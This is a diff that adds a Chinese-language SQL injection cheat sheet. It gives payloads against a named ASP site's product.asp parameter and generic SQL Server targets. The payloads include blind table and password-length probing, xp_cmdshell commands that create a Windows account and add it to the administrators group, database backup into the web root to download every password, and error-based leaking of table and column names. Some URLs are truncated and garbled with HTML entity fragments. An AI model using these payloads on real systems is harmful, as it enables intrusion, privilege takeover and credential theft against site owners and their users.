@@ -1,0 +1,42 @@
+ACCESS
+
+查询数据库类型 
+http://www.zengke.com/product.asp?sort_id ... exists (select * from sysobjects)
+
+查询表admin页面返回正常显示为有，错误为无。
+http://www.zengke.com//product.asp?sort_id ... exists (select * from admin)
+
+查询admin表中的项admin
+/product.asp?sort_id=24 and exists (select admin_name from admin) 
+
+查询admin表中的项admin里面的内容长度 小于出错 等于返回正常
+http://www.zengke.com//product.asp?sort_id=24&am ... bsp;Top 1 len(cstr([pwd])) From (Select Top 1 * From [admin] Where 1=1 Order by [pwd]) T Order by [pwd] desc)<=7
+
+暴力猜解admin表中的项admin_name
+
+SQL
+
+
+①http://Site/url.asp?id=1;exec master..xp_cmdshell “net user name password /add”--
+
+　　分号;在SQLServer中表示隔开前后两句语句，--表示后面的语句为注释，所以，这句语句在SQLServer中将被分成两句执行，先是Select出ID=1的记录，然后执行存储过程xp_cmdshell，这个存储过程用于调用系统命令，于是，用net命令新建了用户名为name、密码为password的windows的帐号，接着：
+
+②http://Site/url.asp?id=1;exec master..xp_cmdshell “net localgroup administrators name /add”--
+
+　　将新建的帐号name加入管理员组，不用两分钟，你已经拿到了系统最高权限！当然，这种方法只适用于用sa连接数据库的情况，否则，是没有权限调用xp_cmdshell的。
+
+　　③http://Site/url.asp?id=1 ;;and db_name()>0
+
+前面有个类似的例子and user>0，作用是获取连接用户名，db_name()是另一个系统变量，返回的是连接的数据库名。
+
+④http://Site/url.asp?id=1;backup database 数据库名 to disk=’c:inetpubwwwroot.db’;--
+
+这是相当狠的一招，从③拿到的数据库名，加上某些IIS出错暴露出的绝对路径，将数据库备份到Web目录下面，再用HTTP把整个数据库就完完整整的下载回来，所有的管理员及用户密码都一览无遗！在不知道绝对路径的时候，还可以备份到网络地址的方法（如\202.96.xx.xxShare.db），但成功率不高。
+
+　　⑤http://Site/url.asp?id=1 ;;and (Select Top& ... objects where xtype=’U’ and status>0)>0
+
+前面说过，sysobjects是SQLServer的系统表，存储着所有的表名、视图、约束及其它对象，xtype=’U’ and status>0，表示用户建立的表名，上面的语句将第一个表名取出，与0比较大小，让报错信息把表名暴露出来。第二、第三个表名怎么获取？还是留给我们聪明的读者思考吧。
+
+⑥http://Site/url.asp?id=1 ;;and (Sel ... sp;col_name(object_id(‘表名’),1) from sysobjects)>0
+
+从⑤拿到表名后，用object_id(‘表名’)获取表名对应的内部ID，col_name(表名ID,1)代表该表的第1个字段名，将1换成2,3,4...就可以逐个获取所猜解表里面的字段名。
